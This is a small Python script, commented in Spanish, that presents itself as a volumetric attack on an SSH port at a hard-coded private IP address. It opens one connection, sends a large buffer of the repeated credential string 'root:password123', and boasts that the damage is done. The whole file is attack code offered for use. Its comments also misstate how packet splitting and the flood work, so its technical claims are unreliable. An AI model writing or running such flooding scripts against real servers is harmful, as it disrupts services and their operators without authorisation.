import socket

IP_OBJETIVO = "10.80.152.41"
PUERTO = 22

print(f"Lanzando ataque volumétrico contra {IP_OBJETIVO}:{PUERTO}...")

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_OBJETIVO, PUERTO))
    
    # En lugar de enviar poco a poco, fabricamos un bloque masivo de 200.000 bytes.
    # Al enviarlo de golpe, Windows lo dividirá en más de 100 paquetes de red muy rápidos.
    payload_masivo = b"root:password123\n" * 15000 
    
    # sendall obliga a enviarlo todo antes de que el servidor remoto pueda cortarnos
    s.sendall(payload_masivo)
    
    s.close()
    print("Avalancha enviada con éxito.")
    
except Exception as e:
    print(f"El servidor cortó la conexión, pero el daño ya está hecho: {e}")